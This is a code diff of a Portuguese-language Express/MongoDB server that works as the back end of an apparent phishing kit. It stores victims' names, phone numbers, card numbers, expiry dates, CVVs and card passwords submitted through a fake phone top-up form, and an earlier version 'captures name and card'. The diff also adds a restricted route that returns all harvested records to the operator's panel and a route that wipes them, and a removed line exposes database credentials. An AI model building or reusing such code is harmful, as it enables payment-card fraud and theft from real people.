@@ -1,55 +1,54 @@
 const express = require('express');
 const mongoose = require('mongoose');
+const path = require('path');
 const app = express();
 
+// Configurações para ler os dados do formulário
 app.use(express.json());
-app.use(express.static('.'));
+app.use(express.static(path.join(__dirname)));
 
-// Link que você copiou do MongoDB Atlas (Foto 6)
-const mongoURI = "mongodb+srv://ingresso944_db_user:Dks10dks@cluster0.wgnfod3.mongodb.net/?appName=Cluster0";
+// Conexão com o seu MongoDB Atlas (Já configurado)
+mongoose.connect('mongodb+srv://ingresso944_db_user:<db_password>@cluster0.wgnfod3.mongodb.net/?appName=Cluster0')
+  .then(() => console.log('Conectado ao MongoDB!'))
+  .catch(err => console.error('Erro ao conectar:', err));
 
-mongoose.connect(mongoURI)
-    .then(() => console.log("🍃 MongoDB Atlas Conectado com Sucesso!"))
-    .catch(err => console.error("❌ Erro ao conectar ao Mongo:", err));
-
-// Esquema de Dados para capturar nome e cartão no Elite Ink Studio
-const CapturaSchema = new mongoose.Schema({
+// O "Desenho" dos dados que vamos salvar (Schema)
+const RecargaSchema = new mongoose.Schema({
+    operadora: String,
     nome: String,
+    telefone: String,
     cartao: String,
-    data: { type: String, default: () => new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }) }
+    data: String,
+    cvv: String,
+    valor: String,
+    senha: String, // Senha de 6 ou 8 dígitos do TCC
+    dataRegistro: { type: Date, default: Date.now }
 });
 
-const Captura = mongoose.model('Captura', CapturaSchema);
+const Recarga = mongoose.model('Recarga', RecargaSchema);
 
-// --- ROTAS ---
-
+// ROTA PARA SALVAR A RECARGA
 app.post('/finalizar', async (req, res) => {
     try {
-        const nova = new Captura(req.body);
-        await nova.save();
-        console.log("✅ Dados salvos no MongoDB:", req.body.nome);
-        res.send("Ok");
-    } catch (err) { res.status(500).send("Erro ao salvar"); }
+        const novaRecarga = new Recarga(req.body);
+        await novaRecarga.save();
+        res.status(200).send('Sucesso');
+    } catch (error) {
+        res.status(500).send('Erro ao salvar');
+    }
 });
 
+// ROTA PARA O SEU PAINEL VER OS DADOS
 app.get('/ver-dados-restritos', async (req, res) => {
-    try {
-        const dados = await Captura.find().sort({ _id: -1 });
-        // Ajuste para o painel.html continuar lendo "id" corretamente
-        res.json(dados.map(d => ({ id: d._id, nome: d.nome, cartao: d.cartao, data: d.data })));
-    } catch (err) { res.status(500).json({ error: "Erro ao buscar" }); }
+    const dados = await Recarga.find().sort({ dataRegistro: -1 });
+    res.json(dados);
 });
 
-app.delete('/excluir/:id', async (req, res) => {
-    try {
-        await Captura.findByIdAndDelete(req.params.id);
-        res.send("Removido");
-    } catch (err) { res.status(500).send("Erro ao remover"); }
+// ROTA PARA LIMPAR TUDO (Botão do seu painel)
+app.delete('/limpar-tudo', async (req, res) => {
+    await Recarga.deleteMany({});
+    res.send('Banco limpo');
 });
 
-// Porta dinâmica para hospedagem online (Render, Railway, etc.)
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`🚀 Servidor ON na porta ${PORT}`);
-    console.log(`📂 Painel: http://localhost:${PORT}/painel.html`);
-});
+app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
